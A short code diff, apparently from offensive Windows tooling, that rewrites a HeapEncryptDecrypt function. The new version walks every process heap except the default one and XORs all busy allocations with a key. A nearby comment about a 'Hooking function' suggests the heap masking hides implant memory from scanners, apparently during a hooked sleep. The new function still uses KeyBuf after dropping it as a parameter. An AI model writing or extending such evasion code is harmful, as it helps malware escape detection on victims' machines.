@@ -58,21 +58,29 @@ void XorIT(BYTE* input, size_t length, BYTE key[16]) {
 }
 
 
+void HeapEncryptDecrypt() {
+    
+    DWORD numHeaps = GetProcessHeaps(0, NULL);
+    HANDLE* heaps = (HANDLE*)malloc(sizeof(HANDLE) * numHeaps);
+    GetProcessHeaps(numHeaps, heaps);
 
-void HeapEncryptDecrypt(BYTE KeyBuf[16]) {
-
-   
     PROCESS_HEAP_ENTRY entry;
-    SecureZeroMemory(&entry, sizeof(entry));
-    while (HeapWalk(GetProcessHeap(), &entry)) {
-        if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
-            XorIT((BYTE*)entry.lpData, entry.cbData, KeyBuf);
-            
-        }
+    for (DWORD i = 0; i < numHeaps; i++) {
+        // skip the default process heap
+        if (heaps[i] == GetProcessHeap()) continue;
 
+        SecureZeroMemory(&entry, sizeof(entry));
+        while (HeapWalk(heaps[i], &entry)) {
+            if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
+                XorIT((BYTE*)entry.lpData, entry.cbData, KeyBuf);
+            }
+        }
     }
+    free(heaps);
+
 
 }
+
 
 
 // our Hooking function
